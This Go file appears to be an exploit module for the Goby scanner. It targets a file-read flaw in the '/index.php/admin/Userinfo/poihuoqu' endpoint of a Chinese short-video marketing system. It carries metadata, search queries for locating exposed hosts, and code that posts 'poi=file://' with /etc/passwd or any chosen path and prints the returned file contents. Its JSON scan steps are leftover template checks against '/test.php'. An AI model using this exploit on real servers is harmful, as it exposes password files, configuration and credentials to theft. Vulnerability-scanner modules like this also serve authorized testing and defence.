package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Short video matrix marketing system /index.php/admin/Userinfo/poihuoqu File Read Vulnerability",
    "Description": "<p>The short video matrix marketing system is a product developed by Beijing Huayi Cloud Data Technology Co., Ltd., which focuses on the research and development of Douyin short video matrix marketing system, and is committed to providing enterprises with a full range of short video marketing solutions. Huayiyun's short video matrix system can help enterprises quickly build multiple short video accounts, realize batch production and release of content, and improve the exposure and influence of enterprises on the Douyin platform.An attacker can exploit a file reading vulnerability at the Poihuoqu interface of the short video matrix marketing system to access any file on the server, including password files and configuration files, to obtain system permissions and sensitive information. In addition, an attacker can exploit this vulnerability to read sensitive data in applications, such as database credentials, API keys, etc.</p>",
    "Product": "Short video matrix marketing system",
    "Homepage": "https://www.aymly.com/",
    "DisclosureDate": "2024-10-25",
    "PostTime": "2024-11-06",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"短视频矩阵营销系统\" && title=\"短视频\"",
    "GobyQuery": "body=\"短视频矩阵营销系统\" && title=\"短视频\"",
    "Level": "1",
    "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.</p>",
    "Recommendation": "<p>1. Let web users only access (read) the files and paths they need </p><p> 2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities </p><p> 3. Make it impossible for users to access paths other than the root directory of the web.</p>",
    "References": [
        "https://blog.csdn.net/qq_39894062/article/details/138247630"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize,passwd",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3.4",
    "Translation": {
        "CN": {
            "Name": "短视频矩阵营销系统 /index.php/admin/Userinfo/poihuoqu 文件读取漏洞",
            "Product": "短视频矩阵营销系统",
            "Description": "<p>短视频矩阵营销系统是由北京华益云数据科技有限公司开发的一款产品，这家公司专注于抖音短视频矩阵营销系统的研发，致力于为企业提供全方位的短视频营销解决方案。华益云抖销短视频矩阵系统可以帮助企业快速搭建多个短视频账号，实现内容的批量制作和发布，提高企业在抖音平台的曝光度和影响力。<br></p><p>短视频矩阵营销系统poihuoqu接口处存在文件读取漏洞，攻击者可以利用该漏洞访问服务器上的任意文件，包括密码文件、配置文件等，从而获取系统权限和敏感信息。此外，攻击者还可以利用该漏洞读取应用程序中的敏感数据，如数据库凭据、API密钥等。<br></p>",
            "Recommendation": "<p>1、让web 用户只能访问（读取），所需要的文件和路径&nbsp;</p><p>2、不能有文件包含漏洞，目录遍历漏洞或其他漏洞&nbsp;</p><p>3、让用户不能访问Web 根目录以外的路径。<br></p>",
            "Impact": "<p>下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Short video matrix marketing system /index.php/admin/Userinfo/poihuoqu File Read Vulnerability",
            "Product": "Short video matrix marketing system",
            "Description": "<p>The short video matrix marketing system is a product developed by Beijing Huayi Cloud Data Technology Co., Ltd., which focuses on the research and development of Douyin short video matrix marketing system, and is committed to providing enterprises with a full range of short video marketing solutions. Huayiyun's short video matrix system can help enterprises quickly build multiple short video accounts, realize batch production and release of content, and improve the exposure and influence of enterprises on the Douyin platform.An attacker can exploit a file reading vulnerability at the Poihuoqu interface of the short video matrix marketing system to access any file on the server, including password files and configuration files, to obtain system permissions and sensitive information. In addition, an attacker can exploit this vulnerability to read sensitive data in applications, such as database credentials, API keys, etc.<br></p>",
            "Recommendation": "<p>1. Let web users only access (read) the files and paths they need&nbsp;</p><p>&nbsp;2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities&nbsp;</p><p>&nbsp;3. Make it impossible for users to access paths other than the root directory of the web.<br></p>",
            "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	postOrGet_m9jXTEDGmn := func(hostInfo *httpclient.FixUrl, fileUrl string, pocContent string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			PsotRequest := httpclient.NewPostRequestConfig(urlGet)
			PsotRequest.Timeout = 15
			PsotRequest.VerifyTls = false
			PsotRequest.FollowRedirect = false
			PsotRequest.Data = "poi=file://" + pocContent
			for headName, headValue := range head {
				PsotRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PsotRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
		}

		resp, err := setPostRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/index.php/admin/Userinfo/poihuoqu"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root",
			}
			// 函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, vulURL, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL + fileUrl
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root"},
			}

			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, "/index.php/admin/Userinfo/poihuoqu", fileUrl)
			re := regexp.MustCompile(`"msg":"(.*)"`)
			match := re.FindStringSubmatch(resp)
			var matchContent string
			if len(match) > 1 {
				matchContent = strings.ReplaceAll(match[1], "\\n", "\n")
				matchContent = strings.ReplaceAll(matchContent,"\\","")
			} else {
				expResult.Success = false
				return expResult
			}
			if err != nil || (!strings.Contains(matchContent, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = "敏感信息泄露\n" + matchContent
			return expResult
		},
	))
}
